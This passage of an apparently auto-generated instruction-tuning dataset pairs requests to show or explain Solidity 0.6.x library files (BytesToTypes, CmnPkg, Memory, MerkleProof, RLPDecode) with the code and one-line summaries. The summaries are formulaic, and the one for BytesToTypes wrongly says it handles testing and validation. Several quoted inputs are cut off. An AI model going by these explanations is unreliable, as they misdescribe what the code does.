\n```", "output": "This file `BytesLib.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for BytesToTypes.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\lib\\0.6.x\\BytesToTypes.sol`:\n\n```sol\npragma solidity 0.6.4;\n\n/**\n * @title BytesToTypes\n * Copyright (c) 2016-2020 zpouladzade/Seriality\n * @dev The BytesToTypes contract converts the memory byte arrays to the standard solidity types\n * @author pouladzade@gmail.com\n */\nlibrary BytesToTypes {\n    function bytesToAddress(uint256 _offst, bytes memory _input) internal pure returns (address _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToBool(uint256 _offst, bytes memory _input) internal pure returns (bool _output) {\n        uint8 x;\n        assembly {\n            x := mload(add(_input, _offst))\n        }\n        x == 0 ? _output = false : _output = true;\n    }\n\n    function getStringSize(uint256 _offst, bytes memory _input) internal pure returns (uint256 size) {\n        assembly {\n            size := mload(add(_input, _offst))\n            let chunk_count := add(div(size, 32), 1) // chunk_count = size/32 + 1\n\n            if gt(mod(size, 32), 0) {\n                // if size%32 > 0\n                chunk_count := add(chunk_count, 1)\n            }\n\n            size := mul(chunk_count, 32) // first 32 bytes reseves for size in strings\n        }\n    }\n\n    function bytesToString(uint256 _offst, bytes memory _input, bytes memory _output) internal pure {\n        uint256 size = 32;\n        assembly {\n            let chunk_count\n\n            size := mload(add(_input, _offst))\n            chunk_count := add(div(size, 32), 1) // chunk_count = size/32 + 1\n\n            if gt(mod(size, 32), 0) { chunk_count := add(chunk_count, 1) } // chunk_count++\n\n            for { let index := 0 } lt(index, chunk_count) { index := add(index, 1) } {\n                mstore(add(_output, mul(index, 32)), mload(add(_input, _offst)))\n                _offst := sub(_offst, 32) // _offst -= 32\n            }\n        }\n    }\n\n    function bytesToBytes32(uint256 _offst, bytes memory _input, bytes32 _output) internal pure {\n        assembly {\n            mstore(_output, add(_input, _offst))\n            mstore(add(_output, 32), add(add(_input, _offst), 32))\n        }\n    }\n\n    function bytesToInt8(uint256 _offst, bytes memory _input) internal pure returns (int8 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt16(uint256 _offst, bytes memory _input) internal pure returns (int16 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt24(uint256 _offst, bytes memory _input) internal pure returns (int24 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt32(uint256 _offst, bytes memory _input) internal pure returns (int32 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt40(uint256 _offst, bytes memory _input) internal pure returns (int40 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt48(uint256 _offst, bytes memory _input) internal pure returns (int48 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt56(uint256 _offst, bytes memory _input) internal pure returns (int56 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt64(uint256 _offst, bytes memory _input) internal pure returns (int64 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt72(uint256 _offst, bytes memory _input) internal pure returns (int72 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt80(uint256 _offst, bytes memory _input) internal pure returns (int80 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt88(uint256 _offst, bytes memory _input) internal pure returns (int88 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt96(uint256 _offst, bytes memory _input) internal pure returns (int96 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt104(uint256 _offst, bytes memory _input) internal pure returns (int104 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt112(uint256 _offst, bytes memory _input) internal pure returns (int112 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt120(uint256 _offst, bytes memory _input) internal pure returns (int120 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt128(uint256 _offst, bytes memory _input) internal pure returns (int128 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt136(uint256 _offst, bytes memory _input) internal pure returns (int136 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt144(uint256 _offst, bytes memory _input) internal pure returns (int144 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt152(uint256 _offst, bytes memory _input) internal pure returns (int152 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt160(uint256 _offst, bytes memory _input) internal pure returns (int160 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt168(uint256 _offst, bytes memory _input) internal pure returns (int168 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt176(uint256 _offst, bytes memory _input) internal pure returns (int176 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt184(uint256 _offst, bytes memory _input) internal pure returns (int184 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt192(uint256 _offst, bytes memory _input) internal pure returns (int192 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt200(uint256 _offst, bytes memory _input) internal pure returns (int200 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt208(uint256 _offst, bytes memory _input) internal pure returns (int208 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt216(uint256 _offst, bytes memory _input) internal pure returns (int216 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt224(uint256 _offst, bytes memory _input) internal pure returns (int224 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt232(uint256 _offst, bytes memory _input) internal pure returns (int232 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt240(uint256 _offst, bytes memory _input) internal pure returns (int240 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt248(uint256 _offst, bytes memory _input) internal pure returns (int248 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToInt256(uint256 _offst, bytes memory _input) internal pure returns (int256 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint8(uint256 _offst, bytes memory _input) internal pure returns (uint8 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint16(uint256 _offst, bytes memory _input) internal pure returns (uint16 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint24(uint256 _offst, bytes memory _input) internal pure returns (uint24 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint32(uint256 _offst, bytes memory _input) internal pure returns (uint32 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint40(uint256 _offst, bytes memory _input) internal pure returns (uint40 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint48(uint256 _offst, bytes memory _input) internal pure returns (uint48 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint56(uint256 _offst, bytes memory _input) internal pure returns (uint56 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint64(uint256 _offst, bytes memory _input) internal pure returns (uint64 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint72(uint256 _offst, bytes memory _input) internal pure returns (uint72 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint80(uint256 _offst, bytes memory _input) internal pure returns (uint80 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint88(uint256 _offst, bytes memory _input) internal pure returns (uint88 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint96(uint256 _offst, bytes memory _input) internal pure returns (uint96 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint104(uint256 _offst, bytes memory _input) internal pure returns (uint104 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint112(uint256 _offst, bytes memory _input) internal pure returns (uint112 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint120(uint256 _offst, bytes memory _input) internal pure returns (uint120 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint128(uint256 _offst, bytes memory _input) internal pure returns (uint128 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint136(uint256 _offst, bytes memory _input) internal pure returns (uint136 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint144(uint256 _offst, bytes memory _input) internal pure returns (uint144 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint152(uint256 _offst, bytes memory _input) internal pure returns (uint152 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint160(uint256 _offst, bytes memory _input) internal pure returns (uint160 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint168(uint256 _offst, bytes memory _input) internal pure returns (uint168 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint176(uint256 _offst, bytes memory _input) internal pure returns (uint176 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint184(uint256 _offst, bytes memory _input) internal pure returns (uint184 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint192(uint256 _offst, bytes memory _input) internal pure returns (uint192 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint200(uint256 _offst, bytes memory _input) internal pure returns (uint200 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint208(uint256 _offst, bytes memory _input) internal pure returns (uint208 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint216(uint256 _offst, bytes memory _input) internal pure returns (uint216 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint224(uint256 _offst, bytes memory _input) internal pure returns (uint224 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint232(uint256 _offst, bytes memory _input) internal pure returns (uint232 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint240(uint256 _offst, bytes memory _input) internal pure returns (uint240 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint248(uint256 _offst, bytes memory _input) internal pure returns (uint248 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToUint256(uint256 _offst, bytes memory _input) internal pure returns (uint256 _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n}\n\n```"}
{"instruction": "What does the file BytesToTypes.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\n/**\n * @title BytesToTypes\n * Copyright (c) 2016-2020 zpouladzade/Seriality\n * @dev The BytesToTypes contract converts the memory byte arrays to the standard solidity types\n * @author pouladzade@gmail.com\n */\nlibrary BytesToTypes {\n    function bytesToAddress(uint256 _offst, bytes memory _input) internal pure returns (address _output) {\n        assembly {\n            _output := mload(add(_input, _offst))\n        }\n    }\n\n    function bytesToBool(uint256 _offst, bytes memory _input) internal pure returns (bool _output) {\n        uint8 x;\n        assembly {\n            x := mload(add(_input, _offst))\n        }\n        x == 0 ? _output = false : _output = true;\n    }\n\n    function getStringSize(uint256 _offst, bytes memory _input) internal pure returns (uint256 size) {\n        assembly {\n            size := mload(add(_input, _offst))\n            let chunk_count := add(div(size, 32), 1) // chunk_count = size/32 + 1\n\n            if gt(mod(size, 32), 0) {\n                // if size%32 > 0\n                chunk_count := add(chunk_count, 1)\n            }\n\n            size := mul(chunk_count, 32) // first 32 bytes reseves for size in strings\n        }\n    }\n\n    function bytesToString(uint256 _offst, bytes memory _input, bytes memory _output) internal pure {\n        uint256 size = 32;\n        assembly {\n            let chunk_count\n\n            size := mload(add(_input, _offst))\n            chunk_count := add(div(size, 32), 1) // chunk_count = size/32 + 1\n\n            if gt(mod(size, 32), 0) { chunk_count := add(chunk_count, 1) } // chunk_count++\n\n            for { let index := 0 } lt(index, chunk_count) { index := add(index, 1) } {\n                mstore(add(_output, mul(index, 32)), mload(add(_input, _offst)))\n                _offst := sub(_offst, 32) // _offst -= 32\n            }\n        }\n    }\n\n    function bytesToBytes32(uint256 _offst, bytes memory _input, bytes32 _output) internal pure {\n        assembly {\n            mstore(_output, add(_input\n```", "output": "This file `BytesToTypes.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle testing and validation."}
{"instruction": "Show me the code for CmnPkg.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\lib\\0.6.x\\CmnPkg.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"./RLPEncode.sol\";\nimport \"./RLPDecode.sol\";\n\nlibrary CmnPkg {\n    using RLPEncode for *;\n    using RLPDecode for *;\n\n    struct CommonAckPackage {\n        uint32 code;\n    }\n\n    function encodeCommonAckPackage(uint32 code) internal pure returns (bytes memory) {\n        bytes[] memory elements = new bytes[](1);\n        elements[0] = uint256(code).encodeUint();\n        return elements.encodeList();\n    }\n\n    function decodeCommonAckPackage(bytes memory msgBytes) internal pure returns (CommonAckPackage memory, bool) {\n        CommonAckPackage memory ackPkg;\n        RLPDecode.Iterator memory iter = msgBytes.toRLPItem().iterator();\n\n        bool success = false;\n        uint256 idx = 0;\n        while (iter.hasNext()) {\n            if (idx == 0) {\n                ackPkg.code = uint32(iter.next().toUint());\n                success = true;\n            } else {\n                break;\n            }\n            ++idx;\n        }\n        return (ackPkg, success);\n    }\n}\n\n```"}
{"instruction": "What does the file CmnPkg.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"./RLPEncode.sol\";\nimport \"./RLPDecode.sol\";\n\nlibrary CmnPkg {\n    using RLPEncode for *;\n    using RLPDecode for *;\n\n    struct CommonAckPackage {\n        uint32 code;\n    }\n\n    function encodeCommonAckPackage(uint32 code) internal pure returns (bytes memory) {\n        bytes[] memory elements = new bytes[](1);\n        elements[0] = uint256(code).encodeUint();\n        return elements.encodeList();\n    }\n\n    function decodeCommonAckPackage(bytes memory msgBytes) internal pure returns (CommonAckPackage memory, bool) {\n        CommonAckPackage memory ackPkg;\n        RLPDecode.Iterator memory iter = msgBytes.toRLPItem().iterator();\n\n        bool success = false;\n        uint256 idx = 0;\n        while (iter.hasNext()) {\n            if (idx == 0) {\n                ackPkg.code = uint32(iter.next().toUint());\n                success = true;\n            } else {\n                break;\n            }\n            ++idx;\n        }\n        return (ackPkg, success);\n    }\n}\n\n```", "output": "This file `CmnPkg.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for Memory.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\lib\\0.6.x\\Memory.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nlibrary Memory {\n    // Size of a word, in bytes.\n    uint256 internal constant WORD_SIZE = 32;\n    // Size of the header of a 'bytes' array.\n    uint256 internal constant BYTES_HEADER_SIZE = 32;\n    // Address of the free memory pointer.\n    uint256 internal constant FREE_MEM_PTR = 0x40;\n\n    // Compares the 'len' bytes starting at address 'addr' in memory with the 'len'\n    // bytes starting at 'addr2'.\n    // Returns 'true' if the bytes are the same, otherwise 'false'.\n    function equals(uint256 addr, uint256 addr2, uint256 len) internal pure returns (bool equal) {\n        assembly {\n            equal := eq(keccak256(addr, len), keccak256(addr2, len))\n        }\n    }\n\n    // Compares the 'len' bytes starting at address 'addr' in memory with the bytes stored in\n    // 'bts'. It is allowed to set 'len' to a lower value then 'bts.length', in which case only\n    // the first 'len' bytes will be compared.\n    // Requires that 'bts.length >= len'\n    function equals(uint256 addr, uint256 len, bytes memory bts) internal pure returns (bool equal) {\n        require(bts.length >= len);\n        uint256 addr2;\n        assembly {\n            addr2 := add(bts, /*BYTES_HEADER_SIZE*/ 32)\n        }\n        return equals(addr, addr2, len);\n    }\n\n    function compareStrings(string memory a, string memory b) internal pure returns (bool) {\n        return (keccak256(abi.encodePacked((a))) == keccak256(abi.encodePacked((b))));\n    }\n\n    // Copy 'len' bytes from memory address 'src', to address 'dest'.\n    // This function does not check the or destination, it only copies\n    // the bytes.\n    function copy(uint256 src, uint256 dest, uint256 len) internal pure {\n        // Copy word-length chunks while possible\n        for (; len >= WORD_SIZE; len -= WORD_SIZE) {\n            assembly {\n                mstore(dest, mload(src))\n            }\n            dest += WORD_SIZE;\n            src += WORD_SIZE;\n        }\n\n        // Copy remaining bytes\n        uint256 mask = 256 ** (WORD_SIZE - len) - 1;\n        assembly {\n            let srcpart := and(mload(src), not(mask))\n            let destpart := and(mload(dest), mask)\n            mstore(dest, or(destpart, srcpart))\n        }\n    }\n\n    // Returns a memory pointer to the provided bytes array.\n    function ptr(bytes memory bts) internal pure returns (uint256 addr) {\n        assembly {\n            addr := bts\n        }\n    }\n\n    // Returns a memory pointer to the data portion of the provided bytes array.\n    function dataPtr(bytes memory bts) internal pure returns (uint256 addr) {\n        assembly {\n            addr := add(bts, /*BYTES_HEADER_SIZE*/ 32)\n        }\n    }\n\n    // This function does the same as 'dataPtr(bytes memory)', but will also return the\n    // length of the provided bytes array.\n    function fromBytes(bytes memory bts) internal pure returns (uint256 addr, uint256 len) {\n        len = bts.length;\n        assembly {\n            addr := add(bts, /*BYTES_HEADER_SIZE*/ 32)\n        }\n    }\n\n    // Creates a 'bytes memory' variable from the memory address 'addr', with the\n    // length 'len'. The function will allocate new memory for the bytes array, and\n    // the 'len bytes starting at 'addr' will be copied into that new memory.\n    function toBytes(uint256 addr, uint256 len) internal pure returns (bytes memory bts) {\n        bts = new bytes(len);\n        uint256 btsptr;\n        assembly {\n            btsptr := add(bts, /*BYTES_HEADER_SIZE*/ 32)\n        }\n        copy(addr, btsptr, len);\n    }\n\n    // Get the word stored at memory address 'addr' as a 'uint'.\n    function toUint(uint256 addr) internal pure returns (uint256 n) {\n        assembly {\n            n := mload(addr)\n        }\n    }\n\n    // Get the word stored at memory address 'addr' as a 'bytes32'.\n    function toBytes32(uint256 addr) internal pure returns (bytes32 bts) {\n        assembly {\n            bts := mload(addr)\n        }\n    }\n}\n\n```"}
{"instruction": "What does the file Memory.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nlibrary Memory {\n    // Size of a word, in bytes.\n    uint256 internal constant WORD_SIZE = 32;\n    // Size of the header of a 'bytes' array.\n    uint256 internal constant BYTES_HEADER_SIZE = 32;\n    // Address of the free memory pointer.\n    uint256 internal constant FREE_MEM_PTR = 0x40;\n\n    // Compares the 'len' bytes starting at address 'addr' in memory with the 'len'\n    // bytes starting at 'addr2'.\n    // Returns 'true' if the bytes are the same, otherwise 'false'.\n    function equals(uint256 addr, uint256 addr2, uint256 len) internal pure returns (bool equal) {\n        assembly {\n            equal := eq(keccak256(addr, len), keccak256(addr2, len))\n        }\n    }\n\n    // Compares the 'len' bytes starting at address 'addr' in memory with the bytes stored in\n    // 'bts'. It is allowed to set 'len' to a lower value then 'bts.length', in which case only\n    // the first 'len' bytes will be compared.\n    // Requires that 'bts.length >= len'\n    function equals(uint256 addr, uint256 len, bytes memory bts) internal pure returns (bool equal) {\n        require(bts.length >= len);\n        uint256 addr2;\n        assembly {\n            addr2 := add(bts, /*BYTES_HEADER_SIZE*/ 32)\n        }\n        return equals(addr, addr2, len);\n    }\n\n    function compareStrings(string memory a, string memory b) internal pure returns (bool) {\n        return (keccak256(abi.encodePacked((a))) == keccak256(abi.encodePacked((b))));\n    }\n\n    // Copy 'len' bytes from memory address 'src', to address 'dest'.\n    // This function does not check the or destination, it only copies\n    // the bytes.\n    function copy(uint256 src, uint256 dest, uint256 len) internal pure {\n        // Copy word-length chunks while possible\n        for (; len >= WORD_SIZE; len -= WORD_SIZE) {\n            assembly {\n                mstore(dest, mload(src))\n            }\n            dest += WORD_SIZE;\n            src += WORD_SIZE;\n        }\n\n        // Copy remaining bytes\n        uint256 ma\n```", "output": "This file `Memory.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for MerkleProof.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\lib\\0.6.x\\MerkleProof.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"./Memory.sol\";\n\nlibrary MerkleProof {\n    function validateMerkleProof(\n        bytes32 appHash,\n        string memory storeName,\n        bytes memory key,\n        bytes memory value,\n        bytes memory proof\n    ) internal view returns (bool) {\n        if (appHash == bytes32(0)) {\n            return false;\n        }\n\n        // | storeName | key length | key | value length | value | appHash  | proof |\n        // | 32 bytes  | 32 bytes   |   | 32 bytes   |     | 32 bytes |\n        bytes memory input = new bytes(128 + key.length + value.length + proof.length);\n\n        uint256 ptr = Memory.dataPtr(input);\n\n        bytes memory storeNameBytes = bytes(storeName);\n        /* solium-disable-next-line */\n        assembly {\n            mstore(ptr, mload(add(storeNameBytes, 32)))\n        }\n\n        uint256 src;\n        uint256 length;\n\n        // write key length and key to input\n        ptr += 32;\n        (src, length) = Memory.fromBytes(key);\n        /* solium-disable-next-line */\n        assembly {\n            mstore(ptr, length)\n        }\n        ptr += 32;\n        Memory.copy(src, ptr, length);\n\n        // write value length and value to input\n        ptr += length;\n        (src, length) = Memory.fromBytes(value);\n        /* solium-disable-next-line */\n        assembly {\n            mstore(ptr, length)\n        }\n        ptr += 32;\n        Memory.copy(src, ptr, length);\n\n        // write appHash to input\n        ptr += length;\n        /* solium-disable-next-line */\n        assembly {\n            mstore(ptr, appHash)\n        }\n\n        // write proof to input\n        ptr += 32;\n        (src, length) = Memory.fromBytes(proof);\n        Memory.copy(src, ptr, length);\n\n        length = input.length + 32;\n\n        uint256[1] memory result;\n        /* solium-disable-next-line */\n        assembly {\n            // call validateMerkleProof precompile contract\n            // Contract address: 0x65\n            if iszero(staticcall(not(0), 0x65, input, length, result, 0x20)) { }\n        }\n\n        return result[0] == 0x01;\n    }\n}\n\n```"}
{"instruction": "What does the file MerkleProof.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"./Memory.sol\";\n\nlibrary MerkleProof {\n    function validateMerkleProof(\n        bytes32 appHash,\n        string memory storeName,\n        bytes memory key,\n        bytes memory value,\n        bytes memory proof\n    ) internal view returns (bool) {\n        if (appHash == bytes32(0)) {\n            return false;\n        }\n\n        // | storeName | key length | key | value length | value | appHash  | proof |\n        // | 32 bytes  | 32 bytes   |   | 32 bytes   |     | 32 bytes |\n        bytes memory input = new bytes(128 + key.length + value.length + proof.length);\n\n        uint256 ptr = Memory.dataPtr(input);\n\n        bytes memory storeNameBytes = bytes(storeName);\n        /* solium-disable-next-line */\n        assembly {\n            mstore(ptr, mload(add(storeNameBytes, 32)))\n        }\n\n        uint256 src;\n        uint256 length;\n\n        // write key length and key to input\n        ptr += 32;\n        (src, length) = Memory.fromBytes(key);\n        /* solium-disable-next-line */\n        assembly {\n            mstore(ptr, length)\n        }\n        ptr += 32;\n        Memory.copy(src, ptr, length);\n\n        // write value length and value to input\n        ptr += length;\n        (src, length) = Memory.fromBytes(value);\n        /* solium-disable-next-line */\n        assembly {\n            mstore(ptr, length)\n        }\n        ptr += 32;\n        Memory.copy(src, ptr, length);\n\n        // write appHash to input\n        ptr += length;\n        /* solium-disable-next-line */\n        assembly {\n            mstore(ptr, appHash)\n        }\n\n        // write proof to input\n        ptr += 32;\n        (src, length) = Memory.fromBytes(proof);\n        Memory.copy(src, ptr, length);\n\n        length = input.length + 32;\n\n        uint256[1] memory result;\n        /* solium-disable-next-line */\n        assembly {\n            // call validateMerkleProof precompile contract\n            // Contract address: 0x65\n            if iszero(staticcall(not(0), 0x65, inp\n```", "output": "This file `MerkleProof.sol` is part of the 0.6.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for RLPDecode.sol which is part of the 0.6.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\lib\\0.6.x\\RLPDecode.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nlibrary RLPDecode {\n    uint8 constant STRING_SHORT_START = 0x80;\n    uint8 constant STRING_LONG_START = 0xb8;\n    uint8 constant LIST_SHORT_START = 0xc0;\n    uint8 constant LIST_LONG_START = 0xf8;\n\n    uint8 constant WORD_SIZE = 32;\n\n    struct RLPItem {\n        uint256 len;\n        uint256 memPtr;\n    }\n\n    struct Iterator {\n        RLPItem item; // Item that's being iterated over.\n        uint256 nextPtr; // Position of the next item in the list.\n    }\n\n    function next(Iterator memory self) internal pure returns (RLPItem memory) {\n        require(hasNext(self));\n\n        uint256 ptr = self.nextPtr;\n        uint256 itemLength = _itemLength(ptr);\n        self.nextPtr = ptr + itemLength;\n\n        return RLPItem(itemLength, ptr);\n    }\n\n    function hasNext(Iterator memory self) internal pure returns (bool) {\n        RLPItem memory item = self.item;\n        return self.nextPtr < item.memPtr + item.len;\n    }\n\n    function toRLPItem(bytes memory self) internal pure returns (RLPItem memory) {\n        uint256 memPtr;\n        assembly {\n            memPtr := add(self, 0x20)\n        }\n\n        return RLPItem(self.length, memPtr);\n    }\n\n    function iterator(RLPItem memory self) internal pure returns (Iterator memory) {\n        require(isList(self));\n\n        uint256 ptr = self.memPtr + _payloadOffset(self.memPtr);\n        return Iterator(self, ptr);\n    }\n\n    function rlpLen(RLPItem memory item) internal pure returns (uint256) {\n        return item.len;\n    }\n\n    function payloadLen(RLPItem memory item) internal pure returns (uint256) {\n        return item.len - _payloadOffset(item.memPtr);\n    }\n\n    function toList(RLPItem memory item) internal pure returns (RLPItem[] memory) {\n        require(isList(item));\n\n        uint256 items = numItems(item);\n        RLPItem[] memory result = new RLPItem[](items);\n\n        uint256 memPtr = item.memPtr + _payloadOffset(item.memPtr);\n        uint256 dataLen;\n        for (uint256 i = 0; i < items; ++i) {\n            dataLen = _itemLength(memPtr);\n            result[i] = RLPItem(dataLen, memPtr);\n            memPtr = memPtr + dataLen;\n        }\n\n        return result;\n    }\n\n    function isList(RLPItem memory item) internal pure returns (bool) {\n        if (item.len == 0) return false;\n\n        uint8 byte0;\n        uint256 memPtr = item.memPtr;\n        assembly {\n            byte0 := byte(0, mload(memPtr))\n        }\n\n        if (byte0 < LIST_SHORT_START) {\n            return false;\n        }\n        return true;\n    }\n\n    function toRlpBytes(RLPItem memory item) internal pure returns (bytes memory) {\n        bytes memory result = new bytes(item.len);\n        if (result.length == 0) return result;\n\n        uint256 ptr;\n        assembly {\n            ptr := add(0x20, result)\n        }\n\n        copy(item.memPtr, ptr, item.len);\n        return result;\n    }\n\n    function toBoolean(RLPItem memory item) internal pure returns (bool) {\n        require(item.len == 1);\n        uint256 result;\n        uint256 memPtr = item.memPtr;\n        assembly {\n            result := byte(0, mload(memPtr))\n        }\n\n        if (result == 0 || result == STRING_SHORT_START) {\n            return false;\n        } else {\n            return true;\n        }\n    }\n\n    function toAddress(RLPItem memory item) internal pure returns (address) {\n        // 1 byte for the length prefix\n        require(item.len == 21);\n\n        return address(toUint(item));\n    }\n\n    function toUint(RLPItem memory item) internal pure returns (uint256) {\n        require(item.len > 0 && item.len <= 33);\n\n        uint256 offset = _payloadOffset(item.memPtr);\n        require(item.len >= offset, \"length is less than offset\");\n        uint256 len = item.len - offset;\n\n        uint256 result;\n        uint256 memPtr = item.memPtr + offset;\n        assembly {\n            result := mload(memPtr)\n\n            // shift to the correct location if necessary\n            if lt(len, 32) { result := div(result, exp(256, sub(32, len))) }\n        }\n\n        return result;\n    }\n\n    // enforces 32 byte length\n    function toUintStrict(RLPItem memory item) internal pure returns (uint256) {\n        // one byte prefix\n        require(item.len == 33);\n\n        uint256 result;\n        uint256 memPtr = item.memPtr + 1;\n        assembly {\n            result := mload(memPtr)\n        }\n\n        return result;\n    }\n\n    function toBytes(RLPItem memory item) internal pure returns (bytes memory) {\n        require(item.len > 0);\n\n        uint256 offset = _payloadOffset(item.memPtr);\n        uint256 len = item.len - offset; // data length\n        bytes memory result = new bytes(len);\n\n        uint256 destPtr;\n        assembly {\n            destPtr := add(0x20, result)\n        }\n\n        copy(item.memPtr + offset, destPtr, len);\n        return result;\n    }\n\n    function numItems(RLPItem memory item) private pure returns (uint256) {\n        if (item.len == 0) return 0;\n\n        uint256 count = 0;\n        uint256 currPtr = item.memPtr + _payloadOffset(item.memPtr);\n        uint256 endPtr = 